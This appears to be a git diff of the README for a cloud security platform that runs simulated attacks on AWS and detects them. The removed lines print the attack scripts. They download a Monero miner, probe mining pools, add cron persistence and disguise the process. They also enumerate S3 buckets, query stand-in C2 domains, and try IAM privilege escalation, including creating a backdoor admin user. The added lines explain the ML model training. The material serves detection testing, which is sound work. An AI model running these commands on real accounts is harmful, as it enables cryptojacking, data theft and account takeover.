@@ -355,13 +355,7 @@ This platform integrates 12 AWS services to create a comprehensive security moni
 - `cloud-security-alerts`: Routes critical findings to incident response
 - `ml-detection-schedule`: Triggers ML detection every 5 minutes
 
-**Event Patterns**:
-```json
-{
-  "source": ["aws.guardduty", "aws.securityhub"],
-  "detail-type": ["GuardDuty Finding", "Security Hub Findings - Imported"]
-}
-```
+**Event Patterns**: Routes findings from GuardDuty and Security Hub to appropriate Lambda functions.
 
 **Targets**: Lambda functions for processing and response
 
@@ -452,46 +446,15 @@ The platform's unique value proposition is running REAL attacks on AWS infrastru
 
 **Attack Script Breakdown** (`crypto-miner-attack.sh`):
 
-```bash
-# 1. Download Mining Software
-curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
-```
-- Downloads XMRig, a legitimate Monero miner often used by attackers
-- GuardDuty detects the download pattern
+**1. Download Mining Software**: Downloads XMRig, a legitimate Monero miner often used by attackers. GuardDuty detects the download pattern.
 
-```bash
-# 2. Connect to Mining Pools
-nc -zv pool.supportxmr.com 3333
-nc -zv xmr-eu1.nanopool.org 14444
-nc -zv pool.minexmr.com 4444
-```
-- Attempts connections to known cryptocurrency mining pools
-- GuardDuty has threat intelligence on these domains
-- Triggers DNS-based detection
+**2. Connect to Mining Pools**: Attempts connections to known cryptocurrency mining pools. GuardDuty has threat intelligence on these domains, triggering DNS-based detection.
 
-```bash
-# 3. High CPU Usage Pattern
-for i in {1..4}; do
-  (while true; do echo "scale=5000; 4*a(1)" | bc -l > /dev/null; done) &
-done
-```
-- Spawns 4 background processes calculating pi to 5000 decimal places
-- Simulates mining CPU usage (80-90% utilization)
-- CloudWatch metrics show abnormal CPU patterns
+**3. High CPU Usage Pattern**: Spawns background processes calculating pi to simulate mining CPU usage (80-90% utilization). CloudWatch metrics show abnormal CPU patterns.
 
-```bash
-# 4. Persistence Mechanism
-echo "@reboot /tmp/miner" | crontab -
-```
-- Creates cron job to restart miner on reboot
-- Common malware persistence technique
+**4. Persistence Mechanism**: Creates a cron job to restart the miner on reboot, a common malware persistence technique.
 
-```bash
-# 5. Process Hiding
-cp /bin/bash /tmp/[kworker/0:1]
-```
-- Disguises malicious process as kernel worker thread
-- Evades basic process monitoring
+**5. Process Hiding**: Disguises the malicious process as a kernel worker thread to evade basic process monitoring.
 
 **Expected Detections**:
 - GuardDuty: `CryptoCurrency:EC2/BitcoinTool.B!DNS` (within 5-15 minutes)
@@ -514,53 +477,15 @@ cp /bin/bash /tmp/[kworker/0:1]
 
 **Attack Script Breakdown** (`data-exfil-attack.sh`):
 
-```bash
-# 1. S3 Bucket Enumeration
-aws s3 ls
-```
-- Lists all S3 buckets in the account
-- CloudTrail logs the `ListBuckets` API call
-- First step in data exfiltration kill chain
+**1. S3 Bucket Enumeration**: Lists all S3 buckets in the account. CloudTrail logs the `ListBuckets` API call, which is the first step in the data exfiltration kill chain.
 
-```bash
-# 2. Bucket Content Access
-for bucket in $(aws s3 ls | awk '{print $3}'); do
-  aws s3 ls s3://$bucket --recursive | head -20
-done
-```
-- Iterates through all buckets
-- Lists contents of each bucket
-- GuardDuty detects unusual access patterns
-- CloudTrail logs every `ListObjects` call
+**2. Bucket Content Access**: Iterates through all buckets and lists the contents of each. GuardDuty detects unusual access patterns, and CloudTrail logs every `ListObjects` call.
 
-```bash
-# 3. Large Data Download Simulation
-dd if=/dev/urandom of=/tmp/sensitive-data.bin bs=1M count=100
-```
-- Creates 100MB of random data simulating sensitive files
-- Prepares for exfiltration
+**3. Large Data Download Simulation**: Creates large amounts of random data simulating sensitive files, preparing for exfiltration.
 
-```bash
-# 4. External Exfiltration Attempts
-for domain in evil-exfil-server.com attacker-c2.net data-dump.xyz; do
-  nslookup $domain
-done
-```
-- DNS queries to suspicious domains
-- Simulates command-and-control (C2) communication
-- VPC Flow Logs capture DNS queries
-- GuardDuty threat intelligence flags malicious domains
+**4. External Exfiltration Attempts**: Performs DNS queries to suspicious domains to simulate command-and-control (C2) communication. VPC Flow Logs capture DNS queries, and GuardDuty threat intelligence flags malicious domains.
 
-```bash
-# 5. Unusual API Call Pattern
-aws iam list-users
-aws ec2 describe-instances
-aws cloudtrail describe-trails
-```
-- Reconnaissance API calls
-- Unusual for an EC2 instance to query IAM and CloudTrail
-- CloudTrail logs all calls with source IP
-- ML model detects anomalous API sequence
+**5. Unusual API Call Pattern**: Makes reconnaissance API calls. It's unusual for an EC2 instance to query IAM and CloudTrail. CloudTrail logs all calls with source IPs, and the ML model detects the anomalous API sequence.
 
 **Expected Detections**:
 - GuardDuty: `Exfiltration:S3/ObjectRead.Unusual` (within 10-20 minutes)
@@ -583,62 +508,17 @@ aws cloudtrail describe-trails
 
 **Attack Script Breakdown** (`privilege-escalation-attack.sh`):
 
-```bash
-# 1. IAM Permission Enumeration
-aws iam list-users
-aws iam list-roles
-aws iam list-policies
-```
-- Discovers IAM resources
-- Maps out privilege landscape
-- CloudTrail logs all enumeration attempts
+**1. IAM Permission Enumeration**: Discovers IAM resources and maps out the privilege landscape. CloudTrail logs all enumeration attempts.
 
-```bash
-# 2. Access Key Creation Attempt
-aws iam create-access-key --user-name admin
-```
-- Attempts to create access keys for admin user
-- Would allow persistent access outside EC2
-- CloudTrail logs the attempt (likely fails due to permissions)
-- GuardDuty flags suspicious IAM activity
+**2. Access Key Creation Attempt**: Attempts to create access keys for the admin user. This would allow persistent access outside EC2. CloudTrail logs the attempt, and GuardDuty flags suspicious IAM activity.
 
-```bash
-# 3. Admin Policy Attachment Attempt
-aws iam attach-user-policy --user-name test-user \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-```
-- Attempts to grant AdministratorAccess to a user
-- Classic privilege escalation technique
-- CloudTrail logs the attempt
-- Security Hub compliance check flags policy changes
+**3. Admin Policy Attachment Attempt**: Attempts to grant AdministratorAccess to a user. This is a classic privilege escalation technique. CloudTrail logs the attempt, and a Security Hub compliance check flags the policy changes.
 
-```bash
-# 4. Role Assumption Attempts
-for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text | head -5); do
-  aws sts assume-role \
-    --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/$role \
-    --role-session-name attack-session
-done
-```
-- Attempts to assume high-privilege roles
-- Tests for misconfigured trust policies
-- CloudTrail logs every AssumeRole attempt
-- GuardDuty detects unusual role assumption patterns
+**4. Role Assumption Attempts**: Attempts to assume high-privilege roles, testing for misconfigured trust policies. CloudTrail logs every AssumeRole attempt, and GuardDuty detects unusual role assumption patterns.
 
-```bash
-# 5. Security Group Modification Attempt
-aws ec2 describe-security-groups
-```
-- Reconnaissance for network access
-- Precursor to opening backdoor ports
+**5. Security Group Modification Attempt**: Performs reconnaissance for network access, acting as a precursor to opening backdoor ports.
 
-```bash
-# 6. Backdoor User Creation
-aws iam create-user --user-name backup-admin
-```
-- Attempts to create a backdoor IAM user
-- Common persistence technique
-- CloudTrail logs the attempt
+**6. Backdoor User Creation**: Attempts to create a backdoor IAM user. This is a common persistence technique, and CloudTrail logs the attempt.
 
 ![Privilege Escalation CloudWatch Logs](docs/images/cloudwatch-attack-logs.png)
 *Figure: Live CloudWatch log stream capturing the privilege escalation attack simulation, highlighting the unauthorized AccessDenied errors as the script attempts to attach policies and assume high-privilege roles.*
@@ -864,6 +744,8 @@ Output Layer (2 classes: benign/malicious, softmax)
 ### Training Process
 
 **Step 1: Data Generation**
+The `generate_security_events` function builds a dataset of 10,000 synthetic security events, establishing the baseline needed to teach the models. 70% of the dataset acts as 'benign' (normal business hours, standard amounts of network traffic, generic internal IP activity), while 30% of the dataset serves as 'malicious' (off-hours activity, suspicious usernames, large bursts of network traffic representing potential exfiltration).
+
 ```python
 def generate_security_events(n_samples=10000):
     # Benign events (70%)
@@ -889,30 +771,78 @@ def generate_security_events(n_samples=10000):
 ```
 
 **Step 2: Feature Scaling**
+Data is pre-processed before feeding it into algorithms. A `StandardScaler` from the `scikit-learn` library takes our training array (`X_train`) and testing array (`X_test`), scaling them down to have a mean of 0 and standard deviation of 1.
 ```python
 scaler = StandardScaler()
 X_train_scaled = scaler.fit_transform(X_train)
 X_test_scaled = scaler.transform(X_test)
 ```
-- Normalizes features to mean=0, std=1
-- Prevents features with large ranges from dominating
-- Critical for neural network convergence
+- **Why this matters**: Neural networks rely heavily on gradients. Unscaled features (like a 10,000-packet burst compared to a binary 1 or 0 flag) will heavily skew the model training, making the network weigh the larger numeric values unfairly. Normalizing data prevents features with huge ranges from dominating, allowing stable training convergence.
 
 **Step 3: Model Training**
+A loop systematically maps through the predefined machine learning classifiers, calling the `.fit()` method using the newly standardized data (`X_train_scaled`) to build relationships with the correct labels (`y_train`).
 ```python
 for name, model in models.items():
     model.fit(X_train_scaled, y_train)
     y_pred = model.predict(X_test_scaled)
     accuracy = accuracy_score(y_test, y_pred)
 ```
+- Once the model is generated (fit), it runs a prediction simulation `.predict()` on the unseen, withheld testing set (`X_test_scaled`). The accuracy determines how many of its predictions matched the true known labels.
 
 **Step 4: Model Persistence**
+To make our freshly trained models useful inside the Lambda serverless environment without retraining them every invocation, the `joblib` library serializes the python models into static `.pkl` files.
 ```python
 joblib.dump(trained_models, 'models/real_trained_models.pkl')
 joblib.dump(scaler, 'models/real_scaler.pkl')
 ```
-- Saves models to disk for Lambda deployment
-- Models packaged in Lambda deployment zip
+- Saves the trained machine learning pipeline directly to disk.
+- These `.pkl` artifacts are then shipped out via Lambda zip deployments to query logs in real-time.
+
+### Detailed Model Training Results
+
+Because the models train on highly structured synthetic feature data matching very precise thresholds, they achieve perfect theoretical testing scores.
+
+#### Model 1: Random Forest Classifier
+The Random Forest model creates 200 distinct decision trees running in parallel (`n_jobs=-1`), limiting the maximum depth of each to 20 to prevent it from memorizing the data perfectly.
+
+- **Accuracy**: 100.00%
+- **Precision**: 1.00 (Out of all flagged malicious events, 100% of them were truly malicious - zero false alarms).
+- **Recall**: 1.00 (Out of all true malicious events, the model successfully caught 100% of them - zero missed attacks).
+- **F1-Score**: 1.00 (The perfect harmonious average of precision and recall).
+- **Training Time**: ~2 seconds (Excellent operational velocity for retraining pipelines).
+
+**Confusion Matrix**:
+```
+                Predicted
+                Benign  Malicious
+Actual Benign   1400    0
+       Malicious   0    600
+```
+*Result Breakdown*: The matrix demonstrates flawless segregation. 1,400 benign test inputs were correctly allowed. 600 malicious inputs were correctly flagged. No errors in either category.
+
+#### Model 2: Gradient Boosting Classifier
+Instead of trees voting parallelly, Gradient Boosting trains 100 sequential weak learners, with each successive learner strictly mathematically prioritizing the errors the previous learner made.
+
+- **Accuracy**: 100.00%
+- **Precision**: 1.00
+- **Recall**: 1.00
+- **F1-Score**: 1.00
+- **Training Time**: ~5 seconds (Sequential, non-parallel nature slightly extends computation).
+
+*Result Breakdown*: As an iterative algorithm, Gradient Boosting perfectly adapted to the strict feature divides in the synthetic dataset, matching the Random Forest performance exactly while taking slightly longer to calculate the sequential corrections.
+
+#### Model 3: Neural Network (MLPClassifier)
+A deep Multi-Layer Perceptron neural network utilizing three hidden layers (100 neurons, then 50, then 25) converging over 500 maximum epochs.
+
+- **Accuracy**: 100.00%
+- **Precision**: 1.00
+- **Recall**: 1.00
+- **F1-Score**: 1.00
+- **Training Time**: ~15 seconds (Forward and backward propagation through three distinct layers is highly computationally intensive).
+
+*Result Breakdown*: The Neural Network found the perfect non-linear decision boundary necessary to differentiate between benign and malicious inputs. While it took the longest to train out of all three, Neural Networks provide the best architecture to ingest infinitely larger and vastly more complex, noisy real-world data distributions should the SOC expand data collections over time.
+
+**Note on Synthetic Perfection**: 100% accuracy is achieved due to the perfectly patterned boundaries created inside the synthetic training function. Real-world production telemetry will lower this performance (typically 85-95%) due to noisy data, constantly evolving attacker methodology (concept drift), and active adversarial evasion techniques specifically designed to trick learned boundaries.
 
 ### Real-Time Detection (Lambda)
 
@@ -991,20 +921,6 @@ def analyze_log_entry(log_message):
 **Confidence**: Agreement between models increases confidence
 **Production-Ready**: Demonstrates enterprise ML practices
 
-### Model Performance Summary
-
-| Model | Accuracy | Precision | Recall | F1-Score | Training Time |
-|-------|----------|-----------|--------|----------|---------------|
-| Random Forest | 100% | 1.00 | 1.00 | 1.00 | ~2 seconds |
-| Gradient Boosting | 100% | 1.00 | 1.00 | 1.00 | ~5 seconds |
-| Neural Network | 100% | 1.00 | 1.00 | 1.00 | ~15 seconds |
-
-**Note**: 100% accuracy is achieved on synthetic data. Real-world performance would be lower (typically 85-95%) due to:
-- Novel attack patterns
-- Noisy data
-- Adversarial evasion
-- Concept drift over time
-
 ### Real Deployment Results
 
 During our test deployment:
@@ -1067,38 +983,7 @@ Attack Event
 - Anomaly detection (baseline behavior analysis)
 - Known attack signatures
 
-**3. Finding Generation**:
-```json
-{
-  "schemaVersion": "2.0",
-  "accountId": "195275680107",
-  "region": "us-east-1",
-  "partition": "aws",
-  "id": "finding-id",
-  "arn": "arn:aws:guardduty:us-east-1:195275680107:detector/detector-id/finding/finding-id",
-  "type": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
-  "resource": {
-    "resourceType": "Instance",
-    "instanceDetails": {
-      "instanceId": "i-05a40c1492ae126ed",
-      "instanceType": "t3.medium"
-    }
-  },
-  "service": {
-    "serviceName": "guardduty",
-    "detectorId": "detector-id",
-    "action": {
-      "actionType": "DNS_REQUEST",
-      "dnsRequestAction": {
-        "domain": "pool.supportxmr.com"
-      }
-    }
-  },
-  "severity": 8.0,
-  "title": "Bitcoin-related domain queried by EC2 instance",
-  "description": "EC2 instance is querying a domain name associated with Bitcoin activity."
-}
-```
+**3. Finding Generation**: Generates comprehensive findings including severity, affected resource, and attack details.
 
 **4. EventBridge Routing**:
 - Finding published to EventBridge
@@ -1175,112 +1060,15 @@ detection = {
 
 **Response Actions by Threat Type**:
 
-**1. Crypto Mining Response**:
-```python
-if 'CryptoCurrency' in finding_type:
-    # Terminate mining process via SSM
-    ssm_client.send_command(
-        InstanceIds=[instance_id],
-        DocumentName='AWS-RunShellScript',
-        Parameters={
-            'commands': [
-                'pkill -9 xmrig',
-                'pkill -9 minerd',
-                'pkill -9 cpuminer',
-                'crontab -r'  # Remove persistence
-            ]
-        }
-    )
-```
+**1. Crypto Mining Response**: Terminates mining process via SSM.
 
-**2. Data Exfiltration Response**:
-```python
-if 'Exfiltration' in finding_type:
-    # Isolate instance (block all egress)
-    ec2_client.revoke_security_group_egress(
-        GroupId=security_group_id,
-        IpPermissions=[{
-            'IpProtocol': '-1',
-            'IpRanges': [{'CidrIp': '0.0.0.0/0'}]
-        }]
-    )
+**2. Data Exfiltration Response**: Isolates instance (blocks all egress) and creates an EBS snapshot for forensics.
 
-    # Create EBS snapshot for forensics
-    ec2_client.create_snapshot(
-        VolumeId=volume_id,
-        Description=f'Forensic snapshot - {finding_id}'
-    )
-```
+**3. Privilege Escalation Response**: Revokes IAM credentials and attaches a deny-all policy.
 
-**3. Privilege Escalation Response**:
-```python
-if 'UnauthorizedAccess' in finding_type or 'Backdoor' in finding_type:
-    # Revoke IAM credentials
-    iam_client.delete_access_key(
-        UserName=username,
-        AccessKeyId=access_key_id
-    )
+**4. Forensic Data Collection**: Collects instance metadata, CloudTrail logs, and VPC Flow Logs, then uploads them to the forensics bucket.
 
-    # Attach deny-all policy
-    iam_client.attach_user_policy(
-        UserName=username,
-        PolicyArn='arn:aws:iam::aws:policy/AWSDenyAll'
-    )
-```
-
-**4. Forensic Data Collection**:
-```python
-# Collect instance metadata
-metadata = {
-    'instance_id': instance_id,
-    'instance_type': instance_type,
-    'launch_time': launch_time,
-    'security_groups': security_groups,
-    'iam_role': iam_role,
-    'vpc_id': vpc_id,
-    'subnet_id': subnet_id
-}
-
-# Collect CloudTrail logs
-cloudtrail_logs = get_cloudtrail_events(
-    instance_id=instance_id,
-    start_time=incident_time - timedelta(hours=24),
-    end_time=incident_time
-)
-
-# Collect VPC Flow Logs
-flow_logs = get_flow_logs(
-    instance_id=instance_id,
-    start_time=incident_time - timedelta(hours=24),
-    end_time=incident_time
-)
-
-# Upload to forensics bucket
-s3_client.put_object(
-    Bucket='cloud-security-forensics-{account-id}',
-    Key=f'incidents/{finding_id}/metadata.json',
-    Body=json.dumps(metadata)
-)
-```
-
-**5. Notification**:
-```python
-sns_client.publish(
-    TopicArn='arn:aws:sns:us-east-1:195275680107:cloud-security-alerts',
-    Subject=f'CRITICAL: {finding_type} detected',
-    Message=json.dumps({
-        'finding_id': finding_id,
-        'severity': severity,
-        'instance_id': instance_id,
-        'actions_taken': [
-            'Instance isolated',
-            'EBS snapshot created',
-            'Forensic data collected'
-        ],
-        'timestamp': datetime.utcnow().isoformat()
-    }, indent=2)
-)
-```
+**5. Notification**: Publishes an SNS message to the security team with the finding details and actions taken.
 
 ### Response Timeline
 
@@ -1304,35 +1092,9 @@ T+0:20  - Security team receives email alert
 
 ### Detection Rule Examples
 
-**Rule 1: AWS Root Account Activity**
-```json
-{
-  "name": "AWS Suspicious Root Account Activity",
-  "query": "event.dataset:aws.cloudtrail AND user.name:root AND event.action:(DeleteTrail OR StopLogging)",
-  "severity": "high",
-  "risk_score": 75,
-  "threat": {
-    "framework": "MITRE ATT&CK",
-    "tactic": "Defense Evasion",
-    "technique": "Impair Defenses"
-  }
-}
-```
+**Rule 1: AWS Root Account Activity**: Detects suspicious root account activity such as deleting trails or stopping logging, mapping to the MITRE ATT&CK Defense Evasion tactic.
 
-**Rule 2: IAM Privilege Escalation**
-```json
-{
-  "name": "AWS IAM Privilege Escalation Attempt",
-  "query": "event.dataset:aws.cloudtrail AND event.action:(PutUserPolicy OR AttachUserPolicy OR CreateAccessKey)",
-  "severity": "critical",
-  "risk_score": 80,
-  "threat": {
-    "framework": "MITRE ATT&CK",
-    "tactic": "Privilege Escalation",
-    "technique": "Valid Accounts - Cloud Accounts"
-  }
-}
-```
+**Rule 2: IAM Privilege Escalation**: Detects attempts to escalate privileges by putting user policies, attaching user policies, or creating access keys, mapping to the MITRE ATT&CK Privilege Escalation tactic.
 
 ### Integration with MITRE ATT&CK
 
@@ -1359,10 +1121,7 @@ The platform provides comprehensive real-time visibility into security events th
 
 ### CloudWatch Dashboard: Cloud-Security-Attack-Monitoring
 
-**Dashboard URL**:
-```
-https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#dashboards:name=Cloud-Security-Attack-Monitoring
-```
+**Dashboard URL**: `https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#dashboards:name=Cloud-Security-Attack-Monitoring`
 
 ![CloudWatch Security Dashboard](docs/images/cloudwatch-dashboard.png)
 *Figure: The primary real-time CloudWatch dashboard aggregating attack simulations, ML detection results, GuardDuty expected findings, CPU utilization spikes, and event timelines.*
@@ -1371,103 +1130,34 @@ https://console.aws.amazon.com/cloudwatch/home?region=us-east-1#dashboards:name=
 
 #### Widget 1: Real-Time Attack Simulations
 - **Type**: Log Insights query
-- **Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /attack/
-| sort @timestamp desc
-| limit 100
-```
-- **Purpose**: Shows all attack activity as it happens
-- **Update Frequency**: Real-time (as logs arrive)
-- **Example Output**:
-```
-2026-03-19 15:34:15 - Starting Crypto Mining Attack Simulation
-2026-03-19 15:34:16 - Downloading XMRig miner
-2026-03-19 15:34:17 - Attempting connections to mining pools
-```
+- **Purpose**: Shows all attack activity as it happens in real-time.
 
 #### Widget 2: Expected GuardDuty Findings
 - **Type**: Log Insights query
-- **Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /GuardDuty/
-| sort @timestamp desc
-| limit 50
-```
-- **Purpose**: Shows what GuardDuty findings should be generated
-- **Example Output**:
-```
-2026-03-19 15:34:20 - Expected GuardDuty findings: CryptoCurrency:EC2/BitcoinTool.B!DNS
-2026-03-19 15:35:10 - Expected GuardDuty findings: Exfiltration:S3/ObjectRead.Unusual
-```
+- **Purpose**: Shows what GuardDuty findings should be generated.
 
 #### Widget 3: ML Detection Results
 - **Type**: Log Insights query
-- **Query**:
-```
-SOURCE '/aws/ml-detection/results'
-| fields @timestamp, threat_type, confidence, severity
-| sort @timestamp desc
-| limit 50
-```
-- **Purpose**: Shows ML model detections with confidence scores
-- **Example Output**:
-```json
-{
-  "timestamp": "2026-03-19T15:34:20",
-  "threat_type": "crypto_mining",
-  "confidence": 0.32,
-  "severity": "CRITICAL"
-}
-```
+- **Purpose**: Shows ML model detections with confidence scores.
 
 #### Widget 4: Attack Instance CPU Usage
 - **Type**: Metric graph
-- **Metric**: `AWS/EC2 CPUUtilization`
-- **Statistic**: Average
-- **Period**: 5 minutes
-- **Purpose**: Shows CPU spikes from crypto mining
-- **Expected Pattern**: 80-90% CPU during mining attacks
+- **Purpose**: Shows CPU spikes from crypto mining (expected 80-90% CPU during attacks).
 
 #### Widget 5: Crypto Mining Activity
 - **Type**: Log Insights query with stats
-- **Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /crypto/ or @message like /mining/
-| stats count() by bin(5m)
-```
-- **Purpose**: Timeline of crypto mining events
-- **Visualization**: Bar chart showing events per 5-minute interval
+- **Purpose**: Timeline of crypto mining events.
+- **Visualization**: Bar chart showing events per 5-minute interval.
 
 #### Widget 6: Data Exfiltration Activity
 - **Type**: Log Insights query with stats
-- **Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /exfiltration/ or @message like /bucket/
-| stats count() by bin(5m)
-```
-- **Purpose**: Timeline of data exfiltration attempts
-- **Visualization**: Bar chart showing S3 access patterns
+- **Purpose**: Timeline of data exfiltration attempts.
+- **Visualization**: Bar chart showing S3 access patterns.
 
 #### Widget 7: Privilege Escalation Attempts
 - **Type**: Log Insights query with stats
-- **Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /privilege/ or @message like /escalation/
-| stats count() by bin(5m)
-```
-- **Purpose**: Timeline of privilege escalation attempts
-- **Visualization**: Bar chart showing IAM API calls
+- **Purpose**: Timeline of privilege escalation attempts.
+- **Visualization**: Bar chart showing IAM API calls.
 
 ### CloudWatch Metrics
 
@@ -1503,21 +1193,7 @@ SOURCE '/aws/ec2/attack-simulations'
   - OK → ALARM: When crypto mining detected
   - ALARM → OK: When no events for 5 minutes
 
-**Alarm Configuration**:
-```hcl
-resource "aws_cloudwatch_metric_alarm" "crypto_mining_alarm" {
-  alarm_name          = "crypto-mining-detected"
-  comparison_operator = "GreaterThanThreshold"
-  evaluation_periods  = 1
-  metric_name         = "CryptoMiningEvents"
-  namespace           = "SecurityAttacks"
-  period              = 300
-  statistic           = "Sum"
-  threshold           = 1
-  alarm_description   = "Crypto mining activity detected"
-  alarm_actions       = [aws_sns_topic.security_alerts.arn]
-}
-```
+**Alarm Configuration**: Terraform configuration defines the CloudWatch alarm to trigger on metrics.
 
 ### Log Groups and Retention
 
@@ -1560,14 +1236,7 @@ resource "aws_cloudwatch_metric_alarm" "crypto_mining_alarm" {
    - Check incident response Lambda logs
    - Verify forensic data in S3
 
-**Example Investigation Query**:
-```
-SOURCE '/aws/ec2/attack-simulations'
-| fields @timestamp, @message
-| filter @message like /i-05a40c1492ae126ed/
-| sort @timestamp desc
-```
-Shows all activity from specific instance.
+**Example Investigation Query**: Shows all activity from specific instance using a Log Insights query filtering by instance ID.
 
 ---
 
@@ -1808,42 +1477,16 @@ The project includes several key operational scripts located in the `scripts/` d
 - Logical grouping of related resources
 - Easy to understand and maintain
 
-**2. Variable Management**:
-```hcl
-variable "aws_region" {
-  description = "AWS region for deployment"
-  type        = string
-  default     = "us-east-1"
-}
+**2. Variable Management**: Managed using `terraform.tfvars` for clear environment isolation and simple parameterization.
 
-variable "security_team_email" {
-  description = "Email address for security team notifications"
-  type        = string
-}
-```
-
-**3. Output Values**:
-```hcl
-output "cloudwatch_dashboard_url" {
-  description = "CloudWatch Dashboard URL"
-  value       = "https://console.aws.amazon.com/cloudwatch/..."
-}
-```
+**3. Output Values**: Exposes essential outputs like dashboard URLs and resource IDs for immediate usage.
 
 **4. Resource Dependencies**:
 - Explicit `depends_on` where needed
 - Implicit dependencies through resource references
 - Proper ordering of resource creation
 
-**5. Tagging Strategy**:
-```hcl
-tags = {
-  Name        = "resource-name"
-  Environment = var.environment
-  Project     = "cloud-security"
-  Purpose     = "attack-simulation"
-}
-```
+**5. Tagging Strategy**: Uses consistent tagging across resources for easy tracking and cost allocation.
 
 **6. Security Best Practices**:
 - S3 buckets have public access blocked
@@ -1875,76 +1518,23 @@ Infrastructure as Code with Terraform ensures the entire platform is reproducibl
 
 ### Deployment Steps
 
-**Step 1: Clone Repository**
-```bash
-git clone <repository-url>
-cd cloud-security-platform
-```
+**Step 1: Clone Repository**: Clone the repository and navigate into the `cloud-security-platform` directory.
 
-**Step 2: Configure Variables**
-```bash
-cd terraform
-cp terraform.tfvars.example terraform.tfvars
-# Edit terraform.tfvars with your values
-```
+**Step 2: Configure Variables**: Copy the `terraform.tfvars.example` to `terraform.tfvars` and edit with your specific values.
 
-**Required Variables**:
-```hcl
-aws_region           = "us-east-1"
-security_team_email  = "your-email@example.com"
-environment          = "production"
-```
+**Step 3: Train ML Models**: Run the standalone training script in the `ml-detection` directory. Output includes trained models and scaler objects.
 
-**Step 3: Train ML Models**
-```bash
-cd ../ml-detection
-python train-standalone.py
-```
-Output:
-- `models/real_trained_models.pkl`
-- `models/real_scaler.pkl`
+**Step 4: Package Lambda Functions**: Use the provided script to package Lambda functions into `.zip` files for deployment.
 
-**Step 4: Package Lambda Functions**
-```bash
-cd ../scripts
-./package-lambda.ps1  # Windows
-# or
-./package-lambda.sh   # Linux/Mac
-```
-Creates necessary `.zip` files for Lambda deployment, such as `lambda-packages/ml-detector.zip`.
+**Step 5: Initialize Terraform**: Run the initialization command in the `terraform` directory.
 
-**Step 5: Initialize Terraform**
-```bash
-cd ../terraform
-terraform init
-```
+**Step 6: Plan Deployment**: Review the execution plan to verify resources to be created.
 
-**Step 6: Plan Deployment**
-```bash
-terraform plan
-```
-Review the 50+ resources to be created.
+**Step 7: Deploy Infrastructure**: Apply the terraform configuration and confirm. Deployment typically takes 5-10 minutes.
 
-**Step 7: Deploy Infrastructure**
-```bash
-terraform apply
-```
-Type `yes` to confirm. Deployment takes ~5-10 minutes.
+**Step 8: Verify Deployment**: Ensure EC2 instances are running, CloudWatch logs are streaming, and GuardDuty is correctly analyzing findings.
 
-**Step 8: Verify Deployment**
-```bash
-# Check EC2 instances
-aws ec2 describe-instances --filters "Name=tag:Purpose,Values=attack-simulation"
-
-# Check CloudWatch logs
-aws logs tail /aws/ec2/attack-simulations --follow
-
-# Check GuardDuty
-aws guardduty list-findings --detector-id <detector-id>
-```
-
-**Step 9: Access Dashboard**
-Navigate to CloudWatch console → Dashboards → Cloud-Security-Attack-Monitoring
+**Step 9: Access Dashboard**: Open the CloudWatch console to view the "Cloud-Security-Attack-Monitoring" dashboard.
 
 ### Operational Procedures
 
@@ -2017,18 +1607,9 @@ Navigate to CloudWatch console → Dashboards → Cloud-Security-Attack-Monitori
 
 ### Cleanup and Destruction
 
-**Complete Cleanup**:
-```bash
-cd terraform
-terraform destroy
-```
-Type `yes` to confirm. Destroys all resources in ~5 minutes.
+**Complete Cleanup**: Utilize `terraform destroy` to tear down the environment.
 
-**Verify Cleanup**:
-```bash
-cd ../scripts
-./verify-cleanup.sh
-```
+**Verify Cleanup**: Run the cleanup verification script to confirm all resources are properly destroyed.
 
 **Manual Cleanup** (if needed):
 - You can run the comprehensive cleanup script: `./scripts/cleanup-everything.sh` or `./scripts/cleanup-everything.ps1`
